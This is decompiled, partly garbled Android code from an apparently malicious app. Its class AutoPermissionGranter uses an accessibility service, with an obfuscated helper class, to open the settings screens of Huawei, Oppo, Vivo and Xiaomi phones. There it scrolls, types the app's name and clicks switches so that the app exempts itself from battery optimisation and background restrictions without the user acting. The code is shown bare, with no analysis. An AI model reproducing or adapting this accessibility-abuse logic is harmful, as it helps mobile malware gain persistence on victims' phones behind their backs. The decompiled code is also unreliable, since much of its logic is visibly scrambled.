        v2 = "android.intent.action.POWER_USAGE_SUMMARY".resolveActivity(1, 0);
        v2 = 268435456; // 0x10000000
        1.addFlags(0);
        if ("android.intent.action.POWER_USAGE_SUMMARY" == null || "android.intent.action.POWER_USAGE_SUMMARY" == 0) { // goto +7
        "android.intent.action.POWER_USAGE_SUMMARY".startActivity(1);
        return;
    }

    private static void goToConsumeEletricityBackgroundManager(int param0) {
        v0 = AutoPermissionGranter.context;
        v1 = AccessibilityServiceCore.CurrentName;
        v2 = Sea_tunesxconcerningn10_rch.searchByText(v0, v1);
        if (v0 == null || v0 == 0) { // goto +14
        v2 = 1;
        AutoPermissionGranter.ifInCheckVivoBatteryDetails = 1;
        // new AutoPermissionGranter$2()
        AutoPermissionGranter.clickByGesture(v0, 1);
        // goto (branch)
        if (1 <= 0) { // goto +31
        v0 = AutoPermissionGranter.context;
        v1 = "com.vivo.abe:id/list_view";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.vivo.abe:id/list_view");
        if (v0 == null || v0 == 0) { // goto +21
        v0 = v0.isScrollable();
        if ("com.vivo.abe:id/list_view" == null || "com.vivo.abe:id/list_view" == 0) { // goto +15
        AutoPermissionGranter.scroll(v0);
        v0 = 200;
        AutoPermissionGranter.sleep(200);
        v2 = 1 + -1;
        AutoPermissionGranter.goToConsumeEletricityBackgroundManager(1);
        return;
    }

    private static void goToConsumeEletricityBackgroundManagerList() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.iqoo.powersaving:id/abnormal_power_manager_tv";
        v1 = Sea_tunesxconcerningn10_rch.searchById(v0, "com.iqoo.powersaving:id/abnormal_power_manager_tv");
        if (v0 == null || v0 == 0) { // goto +8
        v1 = 1;
        AutoPermissionGranter.ifInCheckVivoBatteryList = 1;
        AutoPermissionGranter.click(v0);
        return;
    }

    private static void goToHuaWeiBattery(int param0) {
        v0 = AutoPermissionGranter.batteryKeywords;
        v1 = v0.length;
        v2 = 0;
        if (0 >= v1) { // goto +55
        v3 = v0[0];
        v4 = AutoPermissionGranter.context;
        Sea_tunesxconcerningn10_rch.searchByText(v4, v3);
        if (v3 == null || v3 == 0) { // goto +42
        v3.getParent();
        if (v4 == null || v4 == 0) { // goto +36
        v3.getParent();
        v4.getParent();
        if (v4 == null || v4 == 0) { // goto +26
        v3.getParent();
        v5.getParent();
        v5 = v5.getParent();
        AutoPermissionGranter.click(v5);
        v5 = 1000;
        AutoPermissionGranter.sleep(1000);
        AutoPermissionGranter.goToHuaweiBatteryMoreSetting();
        return;
        v2 = 0 + 1;
        // goto (branch)
        if (1000 <= 0) { // goto +32
        v0 = AutoPermissionGranter.context;
        v1 = "com.android.settings:id/dashboard_container";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.android.settings:id/dashboard_container");
        if (v0 == null || v0 == 0) { // goto +25
        v0 = v0.isScrollable();
        if ("com.android.settings:id/dashboard_container" == null || "com.android.settings:id/dashboard_container" == 0) { // goto +19
        AutoPermissionGranter.scroll(v0);
        v0 = 200;
        AutoPermissionGranter.sleep(200);
        v5 = 1000 + -1;
        AutoPermissionGranter.goToHuaWeiBattery(1000);
        // goto (branch)
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void goToHuaWeiSetting() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckHuaWeiBatteryYh = 1;
        AutoPermissionGranter.goToSetting();
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        v0 = 5;
        AutoPermissionGranter.goToHuaWeiBattery(5);
        return;
    }

    private static void goToHuaweiBatteryMoreSetting() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.huawei.systemmanager:id/list_arrow_more_settings";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.huawei.systemmanager:id/list_arrow_more_settings");
        if (v0 == null || v0 == 0) { // goto +28
        v0.getParent();
        if ("com.huawei.systemmanager:id/list_arrow_more_settings" == null || "com.huawei.systemmanager:id/list_arrow_more_settings" == 0) { // goto +22
        v0.getParent();
        v0 = v0.getParent();
        AutoPermissionGranter.click(v0);
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        AutoPermissionGranter.clickHuaweiSleepNetwork();
        // goto (branch)
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void goToHuaweiSettingAndService() {
        v0 = 0;
        AutoPermissionGranter.ifInCheckHuaWeiBatteryYh = 0;
        v0 = 1;
        AutoPermissionGranter.ifInCheckHhuawei = 1;
        // new Intent()
        v1 = 268435456; // 0x10000000
        1.addFlags(v1);
        v1 = "com.android.settings";
        v2 = "com.android.settings.Settings$AppAndNotificationDashboardActivity";
        1.setClassName("com.android.settings", "com.android.settings.Settings$AppAndNotificationDashboardActivity");
        "com.android.settings".startActivity(1);
        return;
    }

    private static void goToOppoAppDetails() {
        v0 = 0;
        AutoPermissionGranter.ifInCheckOppoBatteryYh = 0;
        v0 = 1;
        AutoPermissionGranter.ifInCheckOppoAppDetails = 1;
        v1 = "android.settings.APPLICATION_DETAILS_SETTINGS";
        // new Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
        v2 = "android.settings.APPLICATION_DETAILS_SETTINGS".getPackageName();
        v2 = 0;
        v3 = "package";
        v1 = Uri.fromParts("package", "android.settings.APPLICATION_DETAILS_SETTINGS", 0);
        1.setData("android.settings.APPLICATION_DETAILS_SETTINGS");
        v1 = 268435456; // 0x10000000
        1.addFlags("android.settings.APPLICATION_DETAILS_SETTINGS");
        "android.settings.APPLICATION_DETAILS_SETTINGS".startActivity(1);
        return;
    }

    private static void goToOppoBattery(int param0) {
        v0 = AutoPermissionGranter.batteryKeywords;
        v1 = v0.length;
        v2 = 0;
        if (0 >= v1) { // goto +37
        v3 = v0[0];
        v4 = AutoPermissionGranter.context;
        Sea_tunesxconcerningn10_rch.searchByText(v4, v3);
        if (v3 == null || v3 == 0) { // goto +24
        v3.getParent();
        if (v4 == null || v4 == 0) { // goto +18
        v5 = v3.getParent();
        AutoPermissionGranter.click(v5);
        v5 = 1000;
        AutoPermissionGranter.sleep(1000);
        AutoPermissionGranter.goToOppoBatteryMoreSetting();
        return;
        v2 = 0 + 1;
        // goto (branch)
        if (1000 <= 0) { // goto +32
        v0 = AutoPermissionGranter.context;
        v1 = "com.android.settings:id/recycler_view";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.android.settings:id/recycler_view");
        if (v0 == null || v0 == 0) { // goto +25
        v0 = v0.isScrollable();
        if ("com.android.settings:id/recycler_view" == null || "com.android.settings:id/recycler_view" == 0) { // goto +19
        AutoPermissionGranter.scroll(v0);
        v0 = 200;
        AutoPermissionGranter.sleep(200);
        v5 = 1000 + -1;
        AutoPermissionGranter.goToOppoBattery(1000);
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoBatteryMoreSetting() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.oplus.battery:id/recycler_view";
        Sea_tunesxconcerningn10_rch.searchById(v0, "com.oplus.battery:id/recycler_view");
        if (v0 == null || v0 == 0) { // goto +89
        v0.isScrollable();
        if ("com.oplus.battery:id/recycler_view" == null || "com.oplus.battery:id/recycler_view" == 0) { // goto +83
        AutoPermissionGranter.scroll(v0);
        AutoPermissionGranter.scroll(v0);
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        v2 = "com.oplus.battery:id/coui_preference_widget_jump";
        Sea_tunesxconcerningn10_rch.searchSById("com.oplus.battery:id/recycler_view", "com.oplus.battery:id/coui_preference_widget_jump");
        if ("com.oplus.battery:id/recycler_view" == null || "com.oplus.battery:id/recycler_view" == 0) { // goto +58
        v2 = "com.oplus.battery:id/recycler_view".size();
        v2 = "com.oplus.battery:id/coui_preference_widget_jump" + -1;
        "com.oplus.battery:id/recycler_view".get("com.oplus.battery:id/coui_preference_widget_jump");
        if ("com.oplus.battery:id/recycler_view" == null || "com.oplus.battery:id/recycler_view" == 0) { // goto +40
        "com.oplus.battery:id/recycler_view".getParent();
        if ("com.oplus.battery:id/coui_preference_widget_jump" == null || "com.oplus.battery:id/coui_preference_widget_jump" == 0) { // goto +34
        "com.oplus.battery:id/recycler_view".getParent();
        "com.oplus.battery:id/coui_preference_widget_jump".getParent();
        if ("com.oplus.battery:id/coui_preference_widget_jump" == null || "com.oplus.battery:id/coui_preference_widget_jump" == 0) { // goto +24
        "com.oplus.battery:id/recycler_view".getParent();
        "com.oplus.battery:id/recycler_view".getParent();
        "com.oplus.battery:id/recycler_view".getParent();
        AutoPermissionGranter.click("com.oplus.battery:id/recycler_view");
        AutoPermissionGranter.sleep(500);
        AutoPermissionGranter.goToOppoBatteryMoreSettingYiChangYh();
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoBatteryMoreSettingYiChangYh() {
        v0 = AutoPermissionGranter.context;
        v1 = "com.oplus.battery:id/recycler_view";
        v1 = Sea_tunesxconcerningn10_rch.searchById(v0, "com.oplus.battery:id/recycler_view");
        if (v0 == null || v0 == 0) { // goto +27
        v1 = 2;
        v0.getChild(2);
        if (v2 == null || v2 == 0) { // goto +20
        v0 = v0.getChild(2);
        AutoPermissionGranter.click(v0);
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        v0 = 10;
        AutoPermissionGranter.searchAndClickOppoBatteryNotYh(10);
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoSetting() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckOppoBatteryYh = 1;
        AutoPermissionGranter.goToSetting();
        v0 = 500;
        AutoPermissionGranter.sleep(500);
        v0 = 5;
        AutoPermissionGranter.goToOppoBattery(5);
        return;
    }

    private static void goToSetting() {
        v0 = new Intent();
        v1 = "android.settings.SETTINGS";
        // new Intent("android.settings.SETTINGS")
        v1 = 268435456; // 0x10000000
        v0.addFlags("android.settings.SETTINGS");
        "android.settings.SETTINGS".startActivity(v0);
        return;
    }

    private static void goToXiaomioAppSettingDetails() {
        v0 = 1;
        AutoPermissionGranter.ifInCheckXiaomiAppDetails = 1;
        v1 = "android.settings.APPLICATION_DETAILS_SETTINGS";
        // new Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
        v2 = "android.settings.APPLICATION_DETAILS_SETTINGS".getPackageName();
        v2 = 0;
        v3 = "package";
        v1 = Uri.fromParts("package", "android.settings.APPLICATION_DETAILS_SETTINGS", 0);
        1.setData("android.settings.APPLICATION_DETAILS_SETTINGS");
        v1 = 268435456; // 0x10000000
        1.addFlags("android.settings.APPLICATION_DETAILS_SETTINGS");
        "android.settings.APPLICATION_DETAILS_SETTINGS".startActivity(1);
        return;
    }

    private static void goToXiaomioConsumeEletricityBackgroundManager() {
        v0 = 1;
        AutoPermissionGranter.ifXiaomioConsumeEletricityBackgroundManager = 1;
        v1 = new StringBuilder();
        v2 = "package:";
        // new StringBuilder("package:")
        "package:".getPackageName();
        v1.append("package:");
        v1.toString();
        v1 = Uri.parse(v1);
        // new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", v1)
        v1 = 268435456; // 0x10000000
        1.addFlags(v1);
        v1 = AutoPermissionGranter.context;
        v1.startActivity(1);
        return;
    }

    private static void input(AccessibilityNodeInfo param0, String param1) {
        if (v2 != null && v2 != 0) { // goto +3
        return;
        v3 = new Bundle();
        // new Bundle()
        v0 = "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE";
        v1 = AccessibilityServiceCore.CurrentName;
        v3.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", v1);
        v0 = 2097152; // 0x200000
        v2.performAction("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", v3);
        v2 = 100;
        AutoPermissionGranter.sleep(100);
        return;
    }

    private static void inputAppName(String param0) {
        v0 = AutoPermissionGranter.context;
        v0 = Sea_tunesxconcerningn10_rch.searchById(v0, v1);
        if (v1 == null || v1 == 0) { // goto +10
        v0 = AccessibilityServiceCore.CurrentName;
        AutoPermissionGranter.input(v1, v0);
        AutoPermissionGranter.checkSwitch();
        return;
    }

    private static void performBack() {
        v0 = AutoPermissionGranter.context;
        v1 = 1;
        v0.performGlobalAction(1);
        return;
    }

    private static void performBackAndHome() {
        v0 = AutoPermissionGranter.context;
        v1 = 1;
        v0.performGlobalAction(1);
        v0 = AutoPermissionGranter.context;
        v1 = 2;
        v0.performGlobalAction(2);
        return;
    }

    private static void performHome() {
        v0 = AutoPermissionGranter.context;
        v1 = 2;
        v0.performGlobalAction(2);
        return;
    }

    private static void scroll(AccessibilityNodeInfo param0) {
        if (v1 == null || v1 == 0) { // goto +13
        v0 = v1.isScrollable();
        if (v0 == null || v0 == 0) { // goto +7
        v0 = 4096;
        v1.performAction(4096);
        return;
    }

    private static void searchAndClickOppoBatteryNotYh(int param0) {
        v1 = AutoPermissionGranter.context;
        v0 = "com.oplus.battery:id/animated_hint_layout";
        v1 = Sea_tunesxconcerningn10_rch.searchById(v1, "com.oplus.battery:id/animated_hint_layout");
        if (v1 == null || v1 == 0) { // goto +20
        AutoPermissionGranter.click(v1);
        v1 = 150;
        AutoPermissionGranter.sleep(150);
        AutoPermissionGranter.inputAppName("com.oplus.battery:id/search_src_text");
        v1 = 700;
        AutoPermissionGranter.sleep(700);
        Sea_tunesxconcerningn10_rch.searchById(700, "com.oplus.battery:id/relativeLayout");
        if (700 == null || 700 == 0) { // goto +11
        // new AutoPermissionGranter$7()
        AutoPermissionGranter.clickByGesture(700, "com.oplus.battery:id/relativeLayout");
        // goto (branch)
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static List searchSById(String param0) {
        v0 = AutoPermissionGranter.context;
        v0.getRootInActiveWindow();
        v0.findAccessibilityNodeInfosByViewId(v1);
        return v1;
    }

    private static void sleep(int param0) {
        v0 = (long) v2;
        Thread.sleep(v0, v1);
        return;
        v0 = new RuntimeException();
        // new RuntimeException(v2)
        throw v0;
    }

    public static void start(AccessibilityServiceCore param0) {
        AutoPermissionGranter.context = v0;
        AutoPermissionGranter.checkDevice();
        // goto (branch)
        v0.printStackTrace();
        return;
    }
}
